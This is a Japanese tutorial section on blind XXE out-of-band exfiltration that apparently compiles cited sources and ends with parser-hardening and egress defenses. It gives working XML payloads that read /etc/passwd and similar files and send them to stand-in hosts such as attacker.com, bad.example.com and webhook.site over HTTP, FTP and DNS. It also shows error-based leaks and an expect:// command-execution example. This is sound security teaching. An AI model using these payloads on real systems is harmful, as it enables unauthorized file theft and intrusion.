## OOB exfiltrationの技法

盲目XXE（Blind XXE）では、攻撃者が注入したXMLの解析結果がHTTPレスポンス本文に一切反映されない。前節までで「XXEは存在するが `&xxe;` を展開しても画面に出てこない」状況を扱ってきたが、本節ではその制約下で**サーバの外へデータを持ち出す（exfiltrate）**ための具体的な技法を、原理レベルで解説する。

キーワードは **OOB（Out-of-Band、帯域外）** と **OAST（Out-of-band Application Security Testing）** である。「帯域外」とは、攻撃者が入力を送り込むチャネル（対象へのHTTPリクエスト）と、結果を受け取るチャネル（攻撃者が支配する別サーバへの着信）を**分離する**という意味だ。対象からのレスポンスを読めなくても、対象が攻撃者サーバへ勝手に接続してくれれば、その接続の中身から情報を抜き出せる。

> ⚠️ **本節のスコープ**: 以下はすべて防御・検証（自分の管理下のシステムや、許可されたテスト環境）を前提とした解説である。実在サービスや本番環境への無許可の検証、破壊的な手順は扱わない。ペイロードは「なぜ動くのか」を理解して**対策する**ために示している。

### まず整理: Blind XXE と OOB XXE の違い

Invictiの解説は、しばしば混同されるこの2語を明確に区別している。

- **Blind XXE**: 注入したエンティティの展開結果が**レスポンスに全く返らない**状態。攻撃者は「何も直接的な応答を得られない」。
- **OOB XXE**: そのBlindな状況を打開するために、**別チャネル（攻撃者サーバへの接続）経由で結果を受け取る**手法。

つまりBlind XXEは「状況（＝レスポンスが盲目）」を指し、OOB XXEはその状況で使う「手段」を指す。実務では「Blind XXEをOOBで攻略する」という関係になる。

> 出典: Out-of-Band XML External Entity (OOB XXE) — https://www.invicti.com/learn/out-of-band-xml-external-entity-oob-xxe

### 最初の一歩: OOB相互作用による「存在確認」

データ持ち出しの前に、そもそもXXEが成立するか（＝パーサが外部エンティティを解決してくれるか）を確かめる必要がある。Shreya Pohekarの解説は、その最小トリガとして次を挙げる。

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]>
```

脆弱なアプリがこのXMLを解析すると、パーサは `xxe` エンティティを解決しようとして `http://attacker.com` へHTTPリクエスト（および事前のDNS名前解決）を発行する。攻撃者サーバのログにその着信（HTTPアクセス、あるいは権威DNSへの問い合わせ）が現れれば、**レスポンスが盲目であっても**「XXEは動いている」と確認できる。ここが「帯域外での確認」の核心だ。

> `SYSTEM "http://..."` はSYSTEM識別子と呼ばれ、XMLパーサに「このURIから外部リソースを取ってこい」と指示する。ローカルファイル（`file://`）でも外部HTTP（`http://`）でも同じ仕組みで、パーサが素直に解決してしまうのがXXEの根本原因である。

> 出典: Blind XXE attacks – OAST to exfiltrate data — https://shreyapohekar.com/blogs/blind-xxe-attacks-out-of-band-interaction-techniques-oast-to-exfilterate-data/

### なぜ「パラメータエンティティ」と「外部DTD」が必須なのか

存在確認まではできても、いざファイルの中身を持ち出そうとすると、素朴な方法は**構文的に破綻する**。ここがBlind XXEで最も理解すべき仕組みだ。

やりたいことは概念的には「ファイル内容を読み、それをURLの一部に埋め込んで攻撃者サーバへ送る」である。ナイーブに書くとこうなる。

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY exfil SYSTEM "http://attacker.com/?x=%file;">   <!-- ← これは動かない -->
```

これが動かない理由は、XMLの仕様上の2つの制約による。

1. **エンティティ宣言の値の中で、別のエンティティを参照する（`%file;`）ことは、内部サブセット（＝リクエスト本文の `<!DOCTYPE ... [ ... ]>` の中）では原則許されない。** パラメータエンティティ参照を「マークアップ宣言の内部」で使うのは、**外部サブセット（外部から読み込むDTD）や外部パラメータエンティティの中**でのみ有効、という規則があるためだ。内部サブセットで `%file;` を宣言途中に置くと整形式（well-formed）違反になる。
2. **一般エンティティ（`&exfil;` として本文で使うもの）は、宣言時点で値が展開されず、参照された時点で展開される。** URLに動的に値を埋め込むには、宣言を「動的に生成」する入れ子構造が要る。

この2つの壁を越えるのが、**「外部DTDに処理を追い出す」＋「パラメータエンティティの入れ子」**という定石である。パラメータエンティティ（`%name;`、DTDの中でのみ使える特殊なエンティティ）は、Shreyaも指摘するとおり「通常のエンティティ（`&name;`）をブロックする入力バリデーションを回避する」効果も持つが、本質的な役割は**外部サブセット内での自由なエンティティ生成**にある。

Shreyaは宣言・参照の構文をこう整理している。

```xml
<!-- 宣言 -->
<!ENTITY % paramentity "my test value">

<!-- 参照（内部サブセットで即座に外部を読ませる例） -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com"> %xxe;]>
```

> 出典: Blind XXE attacks – OAST to exfiltrate data — https://shreyapohekar.com/blogs/blind-xxe-attacks-out-of-band-interaction-techniques-oast-to-exfilterate-data/

### 定石: 外部DTDによるHTTP exfiltration

Invictiが示す典型的な二段構えを見ていく。まず対象へ送るリクエスト本文（内部サブセット）はこうだ。

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://bad.example.com/evil.dtd">
  %dtd;
]>
<data>&send;</data>
```

攻撃者が用意する外部DTD（`bad.example.com/evil.dtd`）はこうだ。

```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://bad.example.com/?collect=%file;'>">
%all;
```

処理の流れ（Invictiの5ステップ）を、パーサ内部で何が起きるかとともに追う。

1. パーサが内部サブセットの `%file` を評価し、`file:///etc/passwd` の**中身**をこのパラメータエンティティの値として読み込む。
2. パーサが `%dtd` を評価し、攻撃者サーバへ `evil.dtd` を**取りに行く**（1回目のOOB接続）。
3. 外部DTD内で `%all` が展開される。`%all` の値は「`send` という一般エンティティの宣言文そのもの」であり、その宣言文の中に `%file;`（＝ファイル内容）が埋め込まれる。**外部サブセット内なのでこの入れ子参照が許される**のがポイント。結果として、`send` は動的に次のような宣言に化ける。
   ```xml
   <!ENTITY send SYSTEM 'http://bad.example.com/?collect=（/etc/passwdの中身）'>
   ```
4. 本文の `<data>&send;</data>` で `send` が参照され、パーサは `collect=` にファイル内容を載せたURLへHTTPリクエストを飛ばす（2回目のOOB接続＝これがデータ持ち出し）。
5. 攻撃者はサーバログのクエリ文字列からファイル内容を復元する。

**なぜ外部DTDに逃がすと動くのか**をもう一度明確にすると、「一般エンティティ `send` の宣言を、ファイル内容を含んだ形で動的に組み立てる」という操作が、外部パラメータエンティティ（`%all`）の展開という形でだけ合法的に書けるからだ。内部サブセットに直接書けばXML整形式違反、外部DTD経由なら合法、という非対称性がこの攻撃の土台になっている。

> 出典: Out-of-Band XML External Entity (OOB XXE) — https://www.invicti.com/learn/out-of-band-xml-external-entity-oob-xxe

同じ構造をShreyaはより明示的な入れ子で示している（`&#x25;` はパーセント記号 `%` のXML数値文字参照。DTD内で「今すぐ `%` として解釈させたくない、後で展開させたい」ときにエスケープする常套手段）。

```xml
<!-- http://attacker.com/exploit.dtd -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://webhook.site/unique-id/?x=%file;'>">
%eval;
%exfil;
```

ここで `&#x25;` を使う理由が重要だ。`%eval` の**値を定義する**時点では、内側の `%` はまだ展開されてほしくない（`exfil` の宣言はあとで `%eval;` を呼んだときに初めて組み立てたい）。もし生の `%` を書くと、その位置でパーサが早すぎるタイミングでパラメータエンティティ参照を解釈しようとして破綻する。そこで `&#x25;`（＝`%`）と書いておき、`%eval;` が展開される瞬間に初めて `%` に戻す——この「展開タイミングの一段ずらし」がBlind XXEペイロードの肝である。

> 出典: Blind XXE attacks – OAST to exfiltrate data — https://shreyapohekar.com/blogs/blind-xxe-attacks-out-of-band-interaction-techniques-oast-to-exfilterate-data/

### 問題児ファイルへの対処: Base64・CDATA・FTP

素朴なHTTP exfiltrationは、ファイル内容が「行き儀の悪い文字」を含むとしばしば失敗する。Shreyaは3つの回避策を整理している。それぞれ**なぜ必要か**を押さえる。

#### 1. Base64エンコード（PHPフィルタ）

`/etc/passwd` のように改行を含むファイルは、URLに直接載せるとリクエストが壊れたり、`file://` の読み込み段階でパーサが停止したりする。PHP環境では `php://filter` ストリームラッパで**読み込みながらBase64化**できる。

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

Base64は英数字と `+/=` だけなので、URLに載せても改行・特殊文字・URI長違反（後述）のリスクが下がる。攻撃者は受信後にデコードする。ramyardaneshgarのリポジトリでも、直接読み込みで文字制限に当たった際に同じ `php://filter/convert.base64-encode/resource=` を用い、DB認証情報やソースコードを含む設定ファイルの抽出に有効だったと報告している。

> 出典: XML External Entity (XXE) Exploitation (ramyardaneshgar) — https://github.com/ramyardaneshgar/XML-External-Entity-XXE-Exploitation

#### 2. CDATAでXMLファイル自体を読む

対象がXMLファイル（例: `/etc/fstab` のような山括弧を含むデータや、任意のXML）だと、パーサがファイル中の `<...>` を**マークアップとして解釈**してしまい内容が壊れる。これを防ぐのが **CDATAセクション** だ。`<![CDATA[ ... ]]>` で囲むと、中身は「純粋な文字データ」として扱われ、パースされない。

```xml
<bar><![CDATA[<abc>myContent</abc>]]></bar>
```

Shreyaの完全なペイロードは、`<![CDATA[`（開始）とファイル内容と `]]>`（終了）を3つのパラメータエンティティで連結して一般エンティティ `content` を作る。

```xml
<!-- 外部DTD: http://attacker.com/evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/fstab">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY content '%start;%file;%end;'>">
```

```xml
<!-- 対象へのリクエスト本文 -->
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  %all;
]>
<data>&content;</data>
```

`content` は `<![CDATA[…ファイル内容…]]>` に展開されるため、内容に含まれる山括弧がマークアップ扱いされず、そのまま安全に運べる。なお、このCDATA手法はレスポンスに反映される（out-of-band不要な）XXEでのファイル読み出しに使われることが多いが、ここでは「XMLとして壊れがちなデータを扱う原理」として押さえておくとよい。

#### 3. FTP exfiltration（URI長の壁を越える）

HTTP GETのURLには実装依存の長さ上限があり、大きなファイルをクエリ文字列に載せると途中で切れる。`ftp://` を使うと、ファイル内容をFTPのパス／コマンドとして送出でき、HTTPのURI長制約や文字エンコーディング要件を回避できる。攻撃者は自前のミニFTPサーバでその「接続時に渡されたパス」をログすればよい。

```xml
<!-- 外部DTD -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % req "<!ENTITY abc SYSTEM 'ftp://x.x.x.x:1212/%file;'>">
```

```xml
<!-- リクエスト本文 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
%dtd;
%req;
]>
<foo>&abc;</foo>
```

> 出典: Blind XXE attacks – OAST to exfiltrate data — https://shreyapohekar.com/blogs/blind-xxe-attacks-out-of-band-interaction-techniques-oast-to-exfilterate-data/

### エラーベース exfiltration（OOB接続が塞がれている場合）

対象サーバから外向きのHTTP/FTPが**完全に遮断**されている環境では、上記のOOB経路が使えない。その場合の代替が**エラーメッセージにデータを載せる**手法だ。Medium（0xzd）の記事はこの外部DTD経由のexfiltrationを扱っており、標準的なPortSwiggerラボの手法に沿っている。

> ⚠️ **未取得の資料**: 「Exploiting Blind XXE: Data Exfiltration thru External DTD（Medium / 0xzd）」は自動取得できませんでした（理由: HTTP 403 Forbidden。egress側でMediumがブロックされたため）。以下のURLからご自身で直接ご覧ください: https://medium.com/@jhncdrcbautista/exploiting-blind-xxe-data-exfiltration-thru-external-dtd-4ac392305b9f

（以下は未取得資料の補足として一般知識、および検索で得たPortSwigger系手法に基づく解説です。）

外部DTDに次を置く。`error` エンティティは「存在しないパス」をSYSTEM URIに持ち、しかもそのパスの一部にファイル内容 `%file;` を埋め込む。

```xml
<!-- 攻撃者の外部DTD -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

`%error;` を展開すると、パーサは `file:///nonexistent/（/etc/passwdの中身）` を開こうとして**失敗**し、その際の例外メッセージに「開けなかったパス」——すなわちファイル内容を連結した文字列——を含めて出力する実装が多い。攻撃者はその**エラーレスポンス本文**からデータを読み取る。これは厳密には「外向き接続を使わない」ため純粋なOOBではないが、レスポンスが盲目でもエラー詳細だけは返る環境で有効な、Blind XXEの重要なバリエーションだ。

> 出典（手法の一次資料）: Finding and exploiting blind XXE vulnerabilities (PortSwigger) — https://portswigger.net/web-security/xxe/blind
> 出典（担当記事、未取得）: Exploiting Blind XXE: Data Exfiltration thru External DTD — https://medium.com/@jhncdrcbautista/exploiting-blind-xxe-data-exfiltration-thru-external-dtd-4ac392305b9f

### エスカレーション: File read → Blind OOB → RCE

ramyardaneshgarのリポジトリは、XXEを「ファイル読み出し → 盲目OOB → RCE」という段階的な侵入経路として体系化している。前半（file read / Base64 / OOB / DNS）はここまでで扱ったとおりだが、最終段のRCEは特筆に値する。

```xml
<!DOCTYPE email [
  <!ENTITY rce SYSTEM "expect://id">
]>
```

これはPHPの `expect://` ストリームラッパを悪用するもので、`expect://id` を解決させるとサーバ上で `id` コマンドが実行される。ただし**PECLの `expect` 拡張が導入・有効化されている**という限定的な誤設定が前提であり、既定のPHPでは動かない。条件が揃えばリバースシェルまで到達しうる。

またDNS exfiltration（「機微データをDNSクエリにエンコードして送る」）は、HTTP/FTPが塞がれていてもDNSの名前解決だけは外に出られる環境で有効だ。攻撃者は自分が権威を持つドメインのサブドメインとしてデータを載せ、権威DNSサーバのログで受信する。

> 出典: XML External Entity (XXE) Exploitation (ramyardaneshgar) — https://github.com/ramyardaneshgar/XML-External-Entity-XXE-Exploitation

### 受信インフラ: OASTツール

OOB exfiltrationは「攻撃者側の受信サーバ」があって初めて成立する。Shreyaが挙げる選択肢を、仕組みの観点で整理する。

- **Burp Collaborator**（Burp Suite Professional）: 専用ドメインと権威DNSを持ち、任意サブドメインをCollaboratorサーバのIPに解決する。CA署名済みのワイルドカード証明書付きでHTTP/HTTPSを提供し、SMTP/SMTPSも受けられる。DNSルックアップ・HTTP接続・メール着信を一元的に観測できるため、外向きが「DNSだけ」「HTTPだけ」など部分的に開いた環境でも経路を切り分けやすい。
- **webhook.site**: 無料でユニークURLを払い出し、そこへのHTTPアクセス（メソッド・ヘッダ・クエリ）をブラウザで即確認できる。手軽なHTTP exfiltrationの受信先として本節のペイロード例にも登場した（`https://webhook.site/unique-id/?x=%file;`）。

**なぜ専用の権威DNSが効くのか**: HTTP接続が完全に遮断されていても、名前解決のためのDNSクエリは組織のリゾルバを経由して外部の権威DNSまで到達することが多い。攻撃者ドメインの権威DNSを握っていれば、「`<ファイル内容をエンコードした文字列>.attacker.com` を解決しようとした」という事実そのものが受信ログに残り、そこからデータを復元できる。これがDNS-only環境でのexfiltrationの原理である。

> 出典: Blind XXE attacks – OAST to exfiltrate data — https://shreyapohekar.com/blogs/blind-xxe-attacks-out-of-band-interaction-techniques-oast-to-exfilterate-data/

### まとめ: なぜ動くのか（原理の総括）と防御

OOB exfiltrationが成立する条件を分解すると、防御の勘所が見える。

1. **パーサが外部エンティティ／外部DTDを解決する**。これが根本原因。攻撃者は `SYSTEM "http://..."` や `SYSTEM "file://..."` をそのまま解決させる。
2. **外部サブセット内でのみパラメータエンティティの入れ子展開が許される**という仕様を突き、一般エンティティ宣言を「ファイル内容入り」で動的生成する。
3. **一般エンティティ参照時にURLへ値が載り、外向き接続が飛ぶ**。レスポンスが盲目でも、この接続が攻撃者に届く。

したがって防御は「入力の検証」では不十分で、**パーサ側で外部解決を止める**のが本筋になる。Invictiが端的に述べるとおり、確実な対策は「外部エンティティの利用を完全に無効化する」ことだ。具体的には各資料が共通して次を挙げる。

- **DTD処理そのものを無効化**する（`disallow-doctype-decl` 相当の機能をON）。これが最も堅い。DOCTYPEを禁止すればパラメータエンティティも外部DTDも成立しない。
- DTDを完全には切れない場合、**外部一般エンティティ・外部パラメータエンティティの解決を個別に無効化**する（`external-general-entities` / `external-parameter-entities` をfalse、`XMLConstants.FEATURE_SECURE_PROCESSING` を有効化 等、言語・パーサごとの安全設定）。
- **外向き通信の制限**（egressフィルタでHTTP/FTP/DNSを最小化）。OOBの受信経路を塞ぐ多層防御。特にDNSまで塞ぐと本節のDNS exfiltrationも封じられる。
- **危険なストリームラッパの無効化**（PHPの `expect://`、`php://filter` など）でRCE・Base64読み出しの前提を崩す。
- 入力のallowlist検証は補助的手段として併用する（ただしパラメータエンティティは一般エンティティ用のフィルタをすり抜けるため、単独では信頼しない）。

> 出典: Out-of-Band XML External Entity (OOB XXE) — https://www.invicti.com/learn/out-of-band-xml-external-entity-oob-xxe
> 出典: XML External Entity (XXE) Exploitation (ramyardaneshgar) — https://github.com/ramyardaneshgar/XML-External-Entity-XXE-Exploitation
